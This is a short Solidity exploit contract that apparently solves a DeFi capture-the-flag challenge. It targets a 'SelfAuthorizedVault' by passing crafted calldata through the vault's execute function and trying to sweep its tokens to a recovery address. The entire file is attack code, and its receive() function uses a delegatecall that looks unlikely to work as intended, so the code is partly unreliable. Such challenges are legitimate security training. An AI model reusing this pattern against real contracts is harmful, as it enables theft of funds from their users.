// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./SelfAuthorizedVault.sol";

contract attackabi{

SelfAuthorizedVault vault;
address vvault;
address token;
address recovery;

constructor(address _vault, address _token, address _recovery){
    vvault = _vault;
    token = _token;
    recovery = _recovery;
    vault = SelfAuthorizedVault(_vault);
}

    function attack(bytes calldata actiondata) public{
    vault.execute(vvault, actiondata);
    }

    receive() external payable {
    vvault.delegatecall(
            abi.encodeWithSignature("sweepFunds(address,IERC20)", recovery, token));
}
}